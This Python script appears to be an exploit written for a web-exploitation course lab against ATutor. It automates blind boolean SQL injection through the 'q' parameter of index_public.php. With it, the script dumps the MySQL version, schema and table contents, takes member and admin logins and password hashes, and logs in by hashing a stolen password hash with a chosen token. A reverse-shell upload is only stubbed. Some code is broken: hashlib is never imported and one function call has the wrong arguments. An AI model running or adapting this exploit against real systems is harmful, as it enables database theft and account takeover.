#!/usr/bin/python3
import argparse
import requests
import sys
import concurrent.futures
from colorama import Fore, Style
from functools import partial

requests.packages.urllib3.\
    disable_warnings(
        requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Interface class to display terminal messages
class Interface():
    def __init__(self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> Advanced Web Attacks and Exploitation')
        print('    >> Python Skeleton Script\n')

    def info(self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning(self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error(self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success(self, message):
        print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")

# Realiza Request
def send_get(debug,burp0_url, burp0_headers, burp0_cookies):
    try:
        # Modo Debug, envia BURP
        if debug is True:
            proxies = {'http': 'http://127.0.0.1:8080',
                       'https': 'http://127.0.0.1:8080'}
            # Realiza requisicao
            r = requests.get(burp0_url, headers=burp0_headers,
                             cookies=burp0_cookies, proxies=proxies)
        else:
            # Realiza requisicao
            r = requests.get(burp0_url, headers=burp0_headers,
                             cookies=burp0_cookies)
    except requests.exceptions.ProxyError:
        output.error('Is your proxy running?')
        sys.exit(-1)
    return r

# Monta Request
def send(debug,payload_inj):
    payload_inj = payload_inj
    payload = "A%27)/**/OR/**/("+payload_inj + \
        ")%23"  # PAYLOAD BASE + SQL Query
    # Copy as Python Requests Burp Extension
    burp0_url = "http://192.168.153.103:80/ATutor/mods/_standard/social/index_public.php?q=" + \
        str(payload)
    burp0_cookies = {"ATutorID": "rbjehabobjubun4aqc06llvhc2", "flash": "no",
                        "_ga": "GA1.1.2069343387.1649010413", "_gid": "GA1.1.570349787.1649010413"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                        "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "X-Forwarded-For": "192.168.33.87"}
    r = send_get(debug,burp0_url, burp0_headers, burp0_cookies)
    return r

# Formata o texto da resposta
def format_text(title, item):
    cr = '\r\n'
    section_break = cr + "*" * 20 + cr
    item = str(item)
    text = Style.BRIGHT + Fore.RED + title + \
        Fore.RESET + section_break + item + section_break
    return text

# Checa se o SQLi esta funcional
def sql_check(debug,ret_true, ret_false, payload_inj):
        r = send(debug,payload_inj)
        if int(r.headers['Content-Length']) == ret_false:
            return False
        elif int(r.headers['Content-Length']) == ret_true:
            return True

# Conta a quantidade de caracteres
def count_db(debug,ret_true, ret_false, payload):
    quant = ""
    for i in range(4):  # percorre 4 casas decimais
        for vers in range(48, 57):  # Numeros de 1-9
            payload_inj = "(ascii(substring(("+payload+")," + \
                str(i)+",1)))=%27"+str(vers)+"%27"
            if sql_check(debug,ret_true, ret_false, payload_inj):
                quant += chr(vers)
                break
    print("[*] Total:", quant)
    return quant

# Base para enumerar cada caractere (blind boolean SQLi) + Normal query + Quantidade a ser enumerado
def get_char(debug,ret_true, ret_false, payload, i, index):     
    # Valida se o caractere e nulo
    payload_inj = "(ascii(substring(("+payload+"/**/limit/**/" + \
        str(i)+",1),"+str(index)+",1)))=%27"+str(0)+"%27"  # TRUE
    # Caso nao seja, prossegue para validar qual seu valor
    if not sql_check(debug,ret_true, ret_false, payload_inj):
        for letter in range(32, 126):  # Percorre caracteres em ascii
            payload_inj = "(ascii(substring(("+payload+"/**/limit/**/" + \
                str(i)+",1),"+str(index)+",1)))=%27" + \
                str(letter)+"%27"  # TRUE
            if sql_check(debug,ret_true, ret_false, payload_inj):
                
                return chr(letter)
            else:
                continue

# Retorna o valor, percorrendo todos os caracteres
def get_word(debug,ret_true, ret_false, payload, quant_words):
    all_words = []
            
    for i in range(int(quant_words)):
        word=[]
        # Usa Threads para percorrer os 64 caracters
        with concurrent.futures.ThreadPoolExecutor(max_workers=64) as executor:
            # Nome Tabela tem ate 64 caracters
            threads=executor.map(partial(get_char,debug,ret_true, ret_false, payload, i),list(range(1, 64)))        
        print("["+str(i+1)+"] Word: ",end="")
        for retrieved_char in threads:            
            if retrieved_char:
                word.append(retrieved_char)
                sys.stdout.write(str(retrieved_char))
                sys.stdout.flush()
        all_words.append("".join(word))
        if i+1<int(quant_words):
            print("")
    print("\n[*] All Words:", all_words,"\n")
    return all_words

# Retorna Tabelas
def get_tables(debug,ret_true, ret_false, db):
    # Escolher o DB
    print("Tables "+db+" Database")

    # Numero de tables
    # SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = 'atutor';
    payload = "SELECT/**/COUNT(*)/**/FROM/**/INFORMATION_SCHEMA.TABLES/**/WHERE/**/table_schema/**/=/**/'"+db+"'"
    qnt_tb = count_db(debug,ret_true, ret_false, payload)

    # Nomes Tabelas de um Database
    # select TABLE_NAME from information_schema.tables WHERE TABLE_SCHEMA="mysql" limit X,1;
    print("[*] Checking all Databases")
    payload = "select/**/TABLE_NAME/**/from/**/information_schema.tables/**/WHERE/**/TABLE_SCHEMA='"+db+"'"
    return get_word(debug,ret_true, ret_false, payload, qnt_tb)

# Retorna Colunas
def get_columns(debug,ret_true, ret_false, db, table):
    # Escolher o DB
    print("Colunas Table:", table, "DB:", db)
    # Numero de colunas
    # SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = 'atutor';
    payload = 'select/**/COUNT(*)/**/from/**/information_schema.columns/**/WHERE/**/TABLE_SCHEMA="' + \
        db+'"/**/AND/**/TABLE_NAME="'+table+'"'
    qnt_cl = count_db(debug,ret_true, ret_false, payload)

    # Nomes Tabelas de um Database
    # select COLUMN_NAME from information_schema.columns WHERE TABLE_SCHEMA="mysql" AND TABLE_NAME="user" limit X,1;
    print("[*] Checking all Columns")
    payload = 'select/**/COLUMN_NAME/**/from/**/information_schema.columns/**/WHERE/**/TABLE_SCHEMA="' + \
        db+'"/**/AND/**/TABLE_NAME="'+table+'"'
    return get_word(debug,ret_true, ret_false, payload, qnt_cl)

# Retorna valor de uma celula na coluna
def get_info(debug,ret_true, ret_false, table, col):
    print("Coluna:", col, "Table:", table)
    # Numero de infos
    # SELECT COUNT(*) login from AT_admins;
    payload = 'select/**/COUNT(*)/**/'+col+'/**/from/**/'+table
    qnt_info = count_db(debug,ret_true, ret_false, payload)

    # Get INFO
    # select login from AT_admins;
    print("[*] Checking all Columns")
    payload = 'select/**/'+col+'/**/from/**/'+table
    return get_word(debug,ret_true, ret_false, payload, qnt_info)

# Main
def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '-t', '--target', help='Target ip address or hostname', required=False)
    parser.add_argument(
        '-li', '--ipaddress', help='Listening IP address for reverse shell', required=False)
    parser.add_argument(
        '-lp', '--port', help='Listening port for reverse shell', required=False)
    parser.add_argument('-u', '--username',
                        help='Username to target', required=False)
    parser.add_argument('-p', '--password',
                        help='Password value to set', required=False)
    parser.add_argument('-d', '--debug', help='Instruct our web requests to use our defined proxy',
                        action='store_true', required=False)
    args = parser.parse_args()

    # Instantiate our interface class
    global output
    output = Interface()

    # Banner
    output.header()

    # Debugging
    debug=args.debug
    if debug:
        for k, v in sorted(vars(args).items()):
            if k == 'debug':
                output.warning(f"Debugging Mode: {v}")
            else:
                print(f"{k}: {v}")

    # POC 1=1, 1=0 | SELECT 1=2 | SELECT 1=1
    # Valor default lentgh de true e false
    ret_true = 180
    ret_false = 20

    if sql_check(debug,ret_true, ret_false, "SELECT/**/1=2") == False and sql_check(debug,ret_true, ret_false, "SELECT/**/1=1") == True:
        output.success("SQLi Working")
    else:
        output.warning("SQLi not Working, please debug")

    # Menu
    choose = input(
        "Deseja fazer o que?\ndata (DB data Dump) | user (get_user) | RCE (full process)\n:")

    if choose == "data":
        # Data Exfiltration
        choose = input(
            "[+] Quer enumerar qual informacao?\n version | db_atual | all_dbs | tables | colunas | info \n:")
        
        # Retorna versao do Mysql
        if choose == "version":
            # DB VERSION
            print("[*] Mysql Version \n0 / 20")
            version = []
            for pos in range(1, 20):  # Version() tem ate 20 caracters

                # Valida se o caractere e nulo
                payload_inj = "(ascii(substring((select/**/version())," + \
                    str(pos)+",1)))=%27"+str(0)+"%27"  # TRUE
                r = send(debug,payload_inj)
                # Caso nao seja, prossegue para validar qual seu valor
                if not sql_check(debug,ret_true, ret_false, payload_inj):
                    for vers in range(32, 126):  # Percorre caracteres em ascii

                        payload_inj = "(ascii(substring((select/**/version())," + \
                            str(pos)+",1)))=%27"+str(vers)+"%27"  # TRUE
                        r = send(debug,payload_inj)
                        if int(r.headers['Content-Length']) == ret_true:
                            version.append(vers)
                            print(pos, "/ 20", chr(vers))
                            break
                        else:
                            continue
                else:
                    print(pos, "/ 20")
                    continue
            print('MYSQL Version:', "".join([chr(c) for c in version]), "\n")

        elif choose == "db_atual":
            # SELECT DATABASE();
            print("[*] Mysql Database \n0 / 64")
            db_actual = []
            for pos in range(1, 64):  # Nome DB tem ate 64 caracters

                # Valida se o caractere e nulo
                payload_inj = "(ascii(substring((SELECT/**/DATABASE())," + \
                    str(pos)+",1)))=%27"+str(0)+"%27"  # TRUE
                r = send(debug,payload_inj)
                # Caso nao seja, prossegue para validar qual seu valor
                if not sql_check(debug,ret_true, ret_false, payload_inj):
                    for vers in range(32, 126):  # Percorre caracteres em ascii

                        payload_inj = "(ascii(substring((SELECT/**/DATABASE())," + \
                            str(pos)+",1)))=%27"+str(vers)+"%27"  # TRUE
                        r = send(debug,payload_inj)
                        if sql_check(debug,ret_true, ret_false, payload_inj):
                            db_actual.append(vers)
                            print(pos, "/ 64", chr(vers))
                            break
                        else:
                            continue
                else:
                    print(pos, "/ 64")
                    continue
            db_actual = "".join([chr(c) for c in db_actual])
            print('MYSQL Database:', db_actual, "\n")

        elif choose == "all_dbs":
            # Quantidade de Databases 0-9
            # SELECT COUNT(distinct TABLE_SCHEMA) from information_schema.tables;
            payload = "SELECT/**/COUNT(distinct/**/TABLE_SCHEMA)/**/from/**/information_schema.tables"
            qnt_db = count_db(debug,ret_true, ret_false, payload)

            # Nomes Databases
            # select distinct TABLE_SCHEMA from information_schema.tables limit X,1;
            print("[*] Checking all Databases")
            payload = "SELECT/**/distinct/**/TABLE_SCHEMA/**/from/**/information_schema.tables"
            dbs = get_word(debug,ret_true, ret_false, payload, qnt_db)

        elif choose == "tables":
            db = input("Qual DB?\n:")
            get_tables(debug,ret_true, ret_false, db)

        elif choose == "colunas":
            db = input("Qual DB?\n:")
            table = input("Qual Tabela?\n:")
            get_columns(debug,ret_true, ret_false, db, table)

        elif choose == "info":
            output.warning("E possivel trazer infos apenas do DB Atual")
            # Ecolher Tabela e coluna
            table = input("Qual Tabela?\n:")
            col = input("Qual Coluna?\n:")
            get_info(debug,ret_true, ret_false, table, col)

        else:
            output.warning("Invalid")

    elif choose == "user":
        # Database Users
        print("[*] Trazendo usuarios comuns")
        print("[*] Login")
        get_info(debug,ret_true, ret_false, "AT_members", "login")
        print("[*] Senha")
        get_info(debug,ret_true, ret_false, "AT_members", "password")
        print("[*] Trazendo usuarios admin")
        print("[*] Login")
        get_info(debug,ret_true, ret_false, "AT_admins", "login")
        print("[*] Senha")
        get_info(debug,ret_true, ret_false, "AT_admins", "password")

    elif choose == "rce":
        # RCE Process
        # Pegar usuario e senha de um usuario comum
        print("[*] Coletando usuario e senha do Database, via SQLi")
        login="".join(get_info(debug,ret_true, ret_false, "AT_members", "login"))
        passwd="".join(get_info(debug,ret_true, ret_false, "AT_members", "password"))
        token="token_generated"
        # Gerar hash senha
        def gen_hash(passwd, token):
            m=hashlib.sha1()
            m.update(passwd.encode('utf-8')+token.encode('utf-8'))
            return m.hexdigest()
        
        # Logar com um hash criado por token setado + senha extraida do DB
        
        def login_hash(token,login,passwd):
            if debug is True:
                proxies = {'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'}            
            hashed = gen_hash(passwd, token)
            b_url = "http://192.168.216.103:80/ATutor/login.php"
            b_cookies = {"ATutorID": "n576l3emb8aqilq5n6plbs2co0", "flash": "no", "_ga": "GA1.1.154296776.1649358591", "_gid": "GA1.1.762530747.1649358591", "_gat": "1"}
            b_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://192.168.216.103", "Connection": "close", "Referer": "http://192.168.216.103/ATutor/login.php", "Upgrade-Insecure-Requests": "1", "X-Forwarded-For": "192.168.33.87"}
            b_data = {"form_login_action": "true", "form_course_id": "0", "form_password_hidden": hashed, "p": '', "form_login": login, "form_password": '', "submit": "Login", "token": token}
            s = requests.Session()
            r = s.post(b_url, headers=b_headers, cookies=b_cookies, data=b_data, proxies=proxies)            
            res = r.text            
            if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res:
                output.success("Logado com sucesso")
            else:
                output.error("[!] Credenciais Incorretas")
            return r        
        login_hash(token,login,passwd,True)
        
        # Upload rev_shell
        # Get Reverse Shell
        
    # Try Harder
    output.success(
        'Exploit has been successfully executed. :eyes: on your listener!')

if __name__ == '__main__':
    main()
